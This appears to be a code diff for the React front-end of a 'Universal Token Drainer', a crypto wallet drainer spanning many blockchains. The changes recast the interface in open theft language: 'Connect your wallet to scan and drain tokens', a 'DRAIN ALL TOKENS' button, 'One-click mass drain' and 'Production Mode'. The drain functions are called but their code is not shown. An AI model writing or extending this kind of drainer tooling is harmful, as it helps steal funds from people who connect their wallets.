                   </div>
                   
                   <div className="stat-card">
-                    <div className="stat-icon">🌐</div>
+                    <div className="stat-icon">⚡</div>
                     <div className="stat-content">
                       <div className="stat-value">{NETWORKS.length}</div>
-                      <div className="stat-label">Networks</div>
+                      <div className="stat-label">Supported</div>
                     </div>
                   </div>
                 </div>
@@ -610,7 +829,7 @@ function MultiNetworkDashboard() {
                 {isScanning && (
                   <div className="progress-container">
                     <div className="progress-header">
-                      <span>Scanning Networks</span>
+                      <span>Live Network Scan</span>
                       <span>{scanProgress.current}/{scanProgress.total}</span>
                     </div>
                     <div className="progress-bar">
@@ -627,53 +846,41 @@ function MultiNetworkDashboard() {
               {/* Control Panel */}
               <div className="control-panel">
                 <div className="panel-header">
-                  <h2>Control Center</h2>
+                  <h2>Live Token Scanner</h2>
                   <div className="action-buttons">
                     <button 
-                      onClick={authenticateAllNetworks}
-                      disabled={isAuthenticating || isScanning}
+                      onClick={scanAllNetworks}
+                      disabled={isScanning || isAuthenticating || isDraining}
                       className="btn btn-primary"
                     >
-                      {isAuthenticating ? '🔐 Authenticating...' : '🔐 Authenticate'}
+                      {isScanning ? '🔄 Live Scanning...' : '🔍 Live Scan All Networks'}
                     </button>
                     
-                    <button 
-                      onClick={scanAllNetworks}
-                      disabled={isScanning || isAuthenticating}
-                      className="btn btn-secondary"
-                    >
-                      {isScanning ? '🔄 Scanning...' : '🔍 Scan All Networks'}
-                    </button>
+                    {getTotalTokens() > 0 && (
+                      <button 
+                        onClick={executeDrainAll}
+                        disabled={isDraining || isScanning}
+                        className="btn btn-danger"
+                      >
+                        {isDraining ? '⚡ Draining All...' : '🔥 DRAIN ALL TOKENS'}
+                      </button>
+                    )}
                   </div>
                 </div>
 
-                {/* Drain Buttons */}
-                {getTotalTokens() > 0 && (
-                  <div className="drain-section">
-                    <h3>Drain Options</h3>
-                    <div className="drain-buttons">
-                      <button 
-                        onClick={executeSmartDrain}
-                        disabled={isDraining || getTotalTokens() === 0}
-                        className="btn btn-success btn-lg"
-                      >
-                        {isDraining ? '⚡ Processing...' : '🧠 Smart Drain (High Value First)'}
-                      </button>
-                      
-                      <button 
-                        onClick={executeDrainAll}
-                        disabled={isDraining || getTotalTokens() === 0}
-                        className="btn btn-danger btn-lg"
-                      >
-                        {isDraining ? '🔥 Draining All...' : '🔥 Drain All Tokens'}
-                      </button>
+                {/* Transaction Status */}
+                {(isDraining || txStatus.general) && (
+                  <div className="drain-status">
+                    <div className="status-header">
+                      <span className="status-title">Drain Status</span>
+                      <span className="status-time">{new Date().toLocaleTimeString()}</span>
                     </div>
-                    
-                    {txStatus.general && (
-                      <div className="tx-status-info">
-                        <span>Status: {txStatus.general}</span>
-                      </div>
-                    )}
+                    <div className="status-content">
+                      <div className="status-main">{txStatus.general}</div>
+                      {txStatus.current && (
+                        <div className="status-current">Current: {txStatus.current}</div>
+                      )}
+                    </div>
                   </div>
                 )}
               </div>
@@ -682,7 +889,7 @@ function MultiNetworkDashboard() {
               {getTotalTokens() > 0 ? (
                 <div className="tokens-display">
                   <div className="display-header">
-                    <h2>Detected Tokens</h2>
+                    <h2>Live Token Balances</h2>
                     <div className="display-summary">
                       <span>{getNetworkCount()} Networks</span>
                       <span>{getTotalTokens()} Tokens</span>
@@ -701,13 +908,32 @@ function MultiNetworkDashboard() {
                     ))}
                   </div>
                 </div>
+              ) : scanComplete ? (
+                <div className="empty-state">
+                  <div className="empty-icon">🔍</div>
+                  <h3>No tokens found</h3>
+                  <p>Scan complete. No tokens detected across {NETWORKS.length} networks.</p>
+                  <button 
+                    onClick={scanAllNetworks}
+                    className="btn btn-primary"
+                  >
+                    Try Again
+                  </button>
+                </div>
               ) : (
                 <div className="empty-state">
-                  <div className="empty-icon">💎</div>
-                  <h3>No tokens detected</h3>
-                  <p>Click "Scan All Networks" to discover tokens across all blockchains</p>
+                  <div className="empty-icon">⚡</div>
+                  <h3>Ready to Scan</h3>
+                  <p>Click "Live Scan All Networks" to detect tokens across all blockchains</p>
                   <div className="network-hint">
-                    <p>Supported: {NETWORKS.map(n => n.symbol).join(', ')}</p>
+                    <p>Live scanning supported for:</p>
+                    <div className="chain-tags">
+                      {NETWORKS.slice(0, 8).map(n => (
+                        <span key={n.id} className="chain-tag" style={{ borderColor: n.color }}>
+                          {n.symbol}
+                        </span>
+                      ))}
+                    </div>
                   </div>
                 </div>
               )}
@@ -751,13 +977,15 @@ function NetworkTokens({ data, txStatus, formatAmount }) {
             <div className="token-main">
               <div className="token-symbol">{token.symbol}</div>
               <div className="token-amount">
-                {formatAmount(token.amount)} {token.symbol}
+                {formatAmount(token.amount, token.decimals < 8 ? token.decimals : 8)} {token.symbol}
               </div>
             </div>
             <div className="token-secondary">
-              <div className="token-value">${token.value ? token.value.toFixed(2) : '0.00'}</div>
+              <div className="token-value">
+                {token.value ? `$${token.value.toFixed(2)}` : 'N/A'}
+              </div>
               <div className="token-status">
-                {txStatus[token.symbol] || 'Ready'}
+                {data.network.type === 'non-evm' ? 'Manual' : 'Auto'}
               </div>
             </div>
           </div>
@@ -773,28 +1001,28 @@ function ConnectionPrompt() {
       <div className="prompt-content">
         <div className="prompt-icon">⚡</div>
         <h2>Universal Token Drainer</h2>
-        <p>Connect your wallet to scan and manage tokens across {NETWORKS.length} blockchains</p>
+        <p>Connect your wallet to scan and drain tokens across {NETWORKS.length} blockchains</p>
         
         <div className="connect-wrapper">
           <ConnectKitButton />
         </div>
         
-        <div className="features-grid">
-          <div className="feature">
-            <div className="feature-icon">🌐</div>
-            <div className="feature-text">{NETWORKS.length} Networks</div>
+        <div className="features-list">
+          <div className="feature-item">
+            <span className="feature-check">✅</span>
+            <span>Live balance scanning</span>
           </div>
-          <div className="feature">
-            <div className="feature-icon">⚡</div>
-            <div className="feature-text">Auto-Scan</div>
+          <div className="feature-item">
+            <span className="feature-check">✅</span>
+            <span>TRON, Solana, Bitcoin support</span>
           </div>
-          <div className="feature">
-            <div className="feature-icon">🔐</div>
-            <div className="feature-text">Secure</div>
+          <div className="feature-item">
+            <span className="feature-check">✅</span>
+            <span>One-click mass drain</span>
           </div>
-          <div className="feature">
-            <div className="feature-icon">🔄</div>
-            <div className="feature-text">Real-time</div>
+          <div className="feature-item">
+            <span className="feature-check">✅</span>
+            <span>Real-time transaction status</span>
           </div>
         </div>
       </div>
@@ -807,12 +1035,12 @@ function Footer() {
     <footer className="app-footer">
       <div className="footer-content">
         <div className="footer-info">
-          <span className="footer-text">Universal Token Drainer v2.0</span>
-          <span className="footer-text">Production Ready</span>
-          <span className="footer-text">All Networks Supported</span>
+          <span className="footer-text">Universal Token Drainer v3.0</span>
+          <span className="footer-text">Live Scanning Enabled</span>
+          <span className="footer-text">Production Mode</span>
         </div>
         <div className="footer-note">
-          ⚡ Connect, Scan, Drain - All in one click
+          ⚡ Connect → Scan → Drain All
         </div>
       </div>
     </footer>
@@ -820,4 +1048,3 @@ function Footer() {
 }
 
 export default TokenDrainApp;
-
